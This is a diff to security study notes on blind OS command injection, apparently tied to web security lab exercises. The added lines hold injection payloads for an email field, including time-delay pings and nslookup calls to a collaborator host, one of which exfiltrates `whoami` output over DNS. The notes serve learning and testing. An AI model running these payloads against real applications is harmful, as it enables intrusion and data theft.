@@ -28,10 +28,12 @@ stockreport.pl & echo aiwefwlguh & 29
 ```
 This command causes the application to ping its loopback network adapter for 10 seconds. 
 
-#### Lab:
+#### Lab: Blind OS command injection with time delays
 Modify the email parameter, changing it to:
 ```
 email=x||ping+-c+10+127.0.0.1||
+email=x& ping -c 10 127.0.0.1 &
+email=x%26+ping+-c+10+127.0.0.1+%26
 ```
 
 ### Exploiting blind OS command injection by redirecting output
@@ -73,3 +75,16 @@ The different shell metacharacters have subtly different behaviors that might ch
 
 Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command. 
 
+### Lab: Blind OS command injection with out-of-band interaction
+x+%26+nslookup+wrrzhjnrmr0erl617nyo9d5i89e02wql.oastify.com+%26
+
+### Lab: Blind OS command injection with out-of-band data exfiltration
+There's a submit feedback page.
+Email field is vulnerable to cmdi
+We send the following payload:
+```bash
+csrf=xZfsDxyDrm2FqPrJYP0rW0dMD9c6Kc8S&name=ff&email=%26+nslookup+`whoami`.s2vlx2kagx0di3vm0srjqessdjja74vt.oastify.com+%26&subject=fff&message=fff222
+```
+In collaborator we see: The Collaborator server received a DNS lookup of type A for the domain name peter-f9iFDt.s2vlx2kagx0di3vm0srjqessdjja74vt.oastify.com. 
+
+peter-f9iFDt is the result of `whoami` command
